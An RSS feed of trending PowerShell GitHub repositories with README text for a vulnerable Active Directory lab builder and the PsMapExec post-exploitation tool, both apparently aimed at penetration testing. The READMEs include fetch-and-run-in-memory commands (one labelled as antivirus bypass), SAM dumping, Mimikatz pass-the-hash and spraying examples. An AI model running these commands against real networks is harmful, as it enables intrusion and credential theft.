<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub PowerShell Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-09-20T01:37:57Z</updated>
  <subtitle>Daily Trending of PowerShell in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>safebuffer/vulnerable-AD</title>
    <updated>2023-09-20T01:37:57Z</updated>
    <id>tag:github.com,2023-09-20:/safebuffer/vulnerable-AD</id>
    <link href="https://github.com/safebuffer/vulnerable-AD" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Create a vulnerable active directory that&#39;s allowing you to test most of the active directory attacks in a local lab&lt;/p&gt;&lt;hr&gt;&lt;h1 align=&#34;center&#34;&gt; Vulnerable-AD &lt;br&gt; &lt;/h1&gt; &#xA;&lt;p&gt;Create a vulnerable active directory that&#39;s allowing you to test most of active directory attacks in local lab&lt;/p&gt; &#xA;&lt;h3&gt;Main Features&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Randomize Attacks&lt;/li&gt; &#xA; &lt;li&gt;Full Coverage of the mentioned attacks&lt;/li&gt; &#xA; &lt;li&gt;you need run the script in DC with Active Directory installed&lt;/li&gt; &#xA; &lt;li&gt;Some of attacks require client workstation&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Supported Attacks&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Abusing ACLs/ACEs&lt;/li&gt; &#xA; &lt;li&gt;Kerberoasting&lt;/li&gt; &#xA; &lt;li&gt;AS-REP Roasting&lt;/li&gt; &#xA; &lt;li&gt;Abuse DnsAdmins&lt;/li&gt; &#xA; &lt;li&gt;Password in Object Description&lt;/li&gt; &#xA; &lt;li&gt;User Objects With Default password (Changeme123!)&lt;/li&gt; &#xA; &lt;li&gt;Password Spraying&lt;/li&gt; &#xA; &lt;li&gt;DCSync&lt;/li&gt; &#xA; &lt;li&gt;Silver Ticket&lt;/li&gt; &#xA; &lt;li&gt;Golden Ticket&lt;/li&gt; &#xA; &lt;li&gt;Pass-the-Hash&lt;/li&gt; &#xA; &lt;li&gt;Pass-the-Ticket&lt;/li&gt; &#xA; &lt;li&gt;SMB Signing Disabled&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Example&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;# if you didn&#39;t install Active Directory yet , you can try &#xA;Install-windowsfeature AD-domain-services&#xA;Import-Module ADDSDeployment&#xA;Install-ADDSForest -CreateDnsDelegation:$false -DatabasePath &#34;C:\\Windows\\NTDS&#34; -DomainMode &#34;7&#34; -DomainName &#34;cs.org&#34; -DomainNetbiosName &#34;cs&#34; -ForestMode &#34;7&#34; -InstallDns:$true -LogPath &#34;C:\\Windows\\NTDS&#34; -NoRebootOnCompletion:$false -SysvolPath &#34;C:\\Windows\\SYSVOL&#34; -Force:$true&#xA;# if you already installed Active Directory, just run the script !&#xA;IEX((new-object net.webclient).downloadstring(&#34;https://raw.githubusercontent.com/wazehell/vulnerable-AD/master/vulnad.ps1&#34;));&#xA;Invoke-VulnAD -UsersLimit 100 -DomainName &#34;cs.org&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;TODO&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Play with workstations !&lt;/li&gt; &#xA; &lt;li&gt;Click close issue button on github&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>The-Viper-One/PsMapExec</title>
    <updated>2023-09-20T01:37:57Z</updated>
    <id>tag:github.com,2023-09-20:/The-Viper-One/PsMapExec</id>
    <link href="https://github.com/The-Viper-One/PsMapExec" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A PowerShell implementation of the popular CrackMapExec tool. No Linux required here!&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;PsMapExec&lt;/h1&gt; &#xA;&lt;p&gt;More detailed documentation on how to use PsMapExec is available on Gitbook: &lt;a href=&#34;https://viperone.gitbook.io/pentest-everything/psmapexec&#34;&gt;https://viperone.gitbook.io/pentest-everything/psmapexec&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;What is PsMapExec&lt;/h2&gt; &#xA;&lt;p&gt;A PowerShell tool heavily inspired by the popular tool CrackMapExec. Far too often I find myself on engagements without access to Linux in order to make use of CrackMapExec.&lt;/p&gt; &#xA;&lt;p&gt;PsMapExec is used as a post-exploitation tool to assess and compromise an Active Directory environment.&lt;/p&gt; &#xA;&lt;h2&gt;What methods does it support&lt;/h2&gt; &#xA;&lt;p&gt;Currently supported methods (Protocols)&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;PsExec&lt;/li&gt; &#xA; &lt;li&gt;RDP&lt;/li&gt; &#xA; &lt;li&gt;SMB Signing&lt;/li&gt; &#xA; &lt;li&gt;WinRM&lt;/li&gt; &#xA; &lt;li&gt;WMI&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Planned methods&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;MSSQL (In testing)&lt;/li&gt; &#xA; &lt;li&gt;IPMI&lt;/li&gt; &#xA; &lt;li&gt;SNMP&lt;/li&gt; &#xA; &lt;li&gt;FTP&lt;/li&gt; &#xA; &lt;li&gt;SSH&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Quick Start&lt;/h2&gt; &#xA;&lt;h3&gt;Load the script directly into memory (Bypass AV)&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;IEX(New-Object System.Net.WebClient).DownloadString(&#34;https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-NETMongoose.ps1&#34;);IEX(New-Object System.Net.WebClient).DownloadString(&#34;https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Load the script directly into memory&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;IEX(New-Object System.Net.WebClient).DownloadString(&#34;https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;br&gt; Execute some commands over WMI&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PsMapExec -Targets Servers -Username Admin -Password Pass -Method WMI -Command &#34;net user&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;br&gt; Check RDP access across all systems&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PsMapExec -Targets All -Username Admin -Password Pass -Method RDP&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;br&gt; Dump SAM over WinRM and Parse the results&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PsMapExec -Targets Servers -Username Admin -Password Pass -Method WinRM -Module SAM -Option Parse&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;br&gt; Authenticate over WMI with a hash and execute mimikatz&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PsMapExec -Targets Workstations -Username Admin -Hash [Hash] -Method WMI -Module LogonPasswords -Option Parse -ShowOutput&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;br&gt; Check SMB Signing on all domain systems&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PsMapExec -Targets All -GenRelayList&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Detailed Usage&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://viperone.gitbook.io/pentest-everything/psmapexec&#34;&gt;https://viperone.gitbook.io/pentest-everything/psmapexec&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://viperone.gitbook.io/pentest-everything/psmapexec/using-credentials&#34;&gt;https://viperone.gitbook.io/pentest-everything/psmapexec/using-credentials&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://viperone.gitbook.io/pentest-everything/psmapexec/methods&#34;&gt;https://viperone.gitbook.io/pentest-everything/psmapexec/methods&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://viperone.gitbook.io/pentest-everything/psmapexec/modules&#34;&gt;https://viperone.gitbook.io/pentest-everything/psmapexec/modules&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://viperone.gitbook.io/pentest-everything/psmapexec/spray&#34;&gt;https://viperone.gitbook.io/pentest-everything/psmapexec/spray&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Aknowledgements&lt;/h2&gt; &#xA;&lt;h2&gt;Dependencies&lt;/h2&gt; &#xA;&lt;p&gt;PsMapExec has some dependencies that need to be pulled from outside the script itself in order to function. Primarily these are:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Kirby (PowerShell based Kerberos ticket dump)&lt;/li&gt; &#xA; &lt;li&gt;Invoke-Pandemonium (Slightly modified Mimikatz)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Currently, they are pulled from a seperate GitHub repository: &lt;a href=&#34;https://github.com/The-Viper-One/PME-Scripts&#34;&gt;https://github.com/The-Viper-One/PME-Scripts&lt;/a&gt; &lt;br&gt; If you are working within an environment that has no external access or GitHub is blocked by a firewall you will need to clone the scripts in the respository onto the system from which PsMapExec is running from.&lt;/p&gt; &#xA;&lt;p&gt;PsMapExec does not currently host a HTTP server for these so you will need to use something like HFS: &lt;a href=&#34;https://www.rejetto.com/hfs/?f=dl&#34;&gt;https://www.rejetto.com/hfs/?f=dl&lt;/a&gt; PsMapExec supports pointing to a locally or alternatively hosted server for the script dependencies.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PsMapExec -Targets All -Username [User] -Password [Pass] -LocalFileServer [IP]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/The-Viper-One/PsMapExec/assets/68926315/499ce08a-153f-434c-ae80-9df24afbe5e4&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Support me&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.buymeacoffee.com/ViperOne&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&#34; alt=&#34;Buy Me A Coffee&#34; style=&#34;height: 60px !important;width: 217px !important;&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Example Images&lt;/h2&gt; &#xA;&lt;h3&gt;Command Execution&lt;/h3&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/The-Viper-One/PsMapExec/assets/68926315/e770e2b3-d441-4094-8a14-94848a3b6b74&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;SAM Dump&lt;/h3&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/The-Viper-One/PsMapExec/assets/68926315/f00a5468-ee99-4db3-82f5-e59223ecf219&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Mimikatz&lt;/h3&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/The-Viper-One/PsMapExec/assets/68926315/a576b9c8-703e-423e-8041-44daca6cf335&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;RDP Access&lt;/h3&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/The-Viper-One/PsMapExec/assets/68926315/ba875e2f-5898-4c10-a33c-7bcb9ef3a2f5&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;</summary>
  </entry>
</feed>